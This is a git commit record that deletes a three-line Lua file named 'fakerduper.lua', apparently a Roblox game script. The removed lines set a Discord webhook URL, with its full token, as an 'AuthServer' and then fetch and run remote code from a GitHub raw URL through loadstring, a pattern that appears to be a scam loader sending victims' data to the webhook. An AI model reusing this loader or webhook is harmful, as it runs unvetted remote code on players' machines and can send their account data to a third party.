6ddfa88df996a4986c38ce2b5e792a4e111641d6
huryyryrs <107345759+huryyryrs@users.noreply.github.com>
2023-01-24 13:41:19 +1030

    Delete fakerduper.lua

--- fakerduper.lua
+++
@@ -1,3 +0,0 @@
-_G.Key = "ssasevolnecaj"
-_G.AuthServer = "https://discord.com/api/webhooks/1061012999181172786/_Ib3JBg6ZAbIlzoEUT_W3O87uiSv41W7acrMOhcAZSOakYgpBjp26rdNWAqwdONwdngz"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
